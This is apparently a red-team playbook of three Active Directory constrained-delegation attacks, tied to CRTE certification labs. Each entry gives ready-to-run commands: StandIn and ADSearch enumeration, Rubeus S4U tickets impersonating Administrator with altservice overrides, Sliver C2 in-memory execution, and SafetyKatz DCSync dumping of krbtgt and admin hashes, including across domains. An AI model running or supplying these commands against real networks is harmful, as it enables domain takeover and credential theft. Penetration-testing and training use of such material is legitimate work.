# Constrained Delegation Abuse

### Constrained Delegation (User Account) – Alternate Service via Rubeus S4U (CRTE + Sliver) [added: 2026-04]
- **Tags:** #ConstrainedDelegation #S4U #Rubeus #Kerberos #UserDelegation #Impersonation #T1558.001
- **Trigger:** User account with msds-allowedtodelegateto attribute found (StandIn/ADSearch/BloodHound); AES256 or NTLM hash available
- **Prereq:** Hash (AES256 or NTLM) of user with constrained delegation, Rubeus.exe available
- **Yields:** TGS as Administrator (or any non-protected user) to the delegated service; direct service access
- **Opsec:** Med
- **Context:** User has constrained delegation to a service (e.g., CIFS/target). Use the user's AES256 hash to impersonate Administrator on the delegated SPN.
- **Payload/Method:**
```powershell
# Enumerate constrained delegation users
.\StandIn.exe --delegation
# OR via LDAP
.\ADSearch.exe --search "(&(objectCategory=user)(msds-allowedtodelegateto=*))" --attributes cn,samaccountname,msds-allowedtodelegateto --json

# Abuse with Rubeus S4U (user account)
.\Rubeus.exe s4u /user:websvc /aes256:<AES256_HASH> /impersonateuser:Administrator /msdsspn:"CIFS/target.domain.local" /ptt

# Via Sliver
[server] sliver (session) > execute-assembly -P <PID> -p 'C:\windows\system32\taskhostw.exe' -t 40 '/path/Rubeus.exe' 's4u /user:websvc /aes256:<HASH> /impersonateuser:Administrator /msdsspn:"CIFS/target" /ptt'
```

### Constrained Delegation (Machine Account) – Alternate Service for DCSync (CRTE + Sliver) [added: 2026-04]
- **Tags:** #ConstrainedDelegation #S4U #AltService #DCSync #MachineDelegation #Rubeus #T1558.001
- **Trigger:** Machine account with msds-allowedtodelegateto on a non-useful service (e.g., TIME); need to pivot to LDAP for DCSync
- **Prereq:** NTLM or AES hash of machine account with constrained delegation, Rubeus.exe and SafetyKatz available
- **Yields:** LDAP TGS via /altservice override, enabling DCSync (krbtgt hash, domain admin hashes)
- **Opsec:** Med
- **Context:** Machine account has constrained delegation to a non-useful service (e.g., TIME). Abuse `/altservice:ldap` to get a LDAP ticket and run DCSync.
- **Payload/Method:**
```powershell
# Enumerate constrained delegation computers
.\StandIn.exe --delegation
# OR
.\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json

# KEY TECHNIQUE: altservice overrides the SPN – no validation on S4U2Proxy target
.\Rubeus.exe s4u /user:MACHINE$ /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:time/dc.domain.local /altservice:ldap /ptt

# Then DCSync
.\SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt" "exit"
```

### Cross-Domain Constrained Delegation (CRTE Exam Report) [added: 2026-04]
- **Tags:** #CrossDomain #ConstrainedDelegation #S4U #AltService #TrustAbuse #ForestPivot #T1558.001
- **Trigger:** User with constrained delegation to a service on a DC in a foreign domain; cross-domain lateral movement needed
- **Prereq:** AES256 key of delegating user, Rubeus.exe and SafetyKatz available, foreign domain DC reachable
- **Yields:** LDAP/CIFS TGS on foreign domain DC via altservice, enabling cross-domain DCSync
- **Opsec:** Med
- **Context:** User with constrained delegation to a service (e.g., TIME) on a DC in a *foreign domain*. Use `/altservice:CIFS` or `LDAP` to pivot cross-domain and DCSync.
- **Payload/Method:**
```
# Step 1: Get TGT for the delegating user
Loader.exe -path Rubeus.exe -args asktgt /user:<DELEGATING_USER> /aes256:<AES256_KEY> /domain:<FOREIGN_DOMAIN> /opsec /nowrap

# Step 2: S4U impersonation with altservice for DCSync
Loader.exe -path Rubeus.exe -args s4u /msdsspn:time/<FOREIGN_DC_FQDN> /impersonateuser:Administrator /domain:<FOREIGN_DOMAIN> /altservice:LDAP /ptt /ticket:<BASE64_TICKET>

# Step 3: DCSync via LDAP ticket
Loader.exe -path SafetyKatz.exe -args "lsadump::dcsync /user:<FOREIGN_DOMAIN>\administrator /domain:<FOREIGN_DOMAIN>" "exit"
```
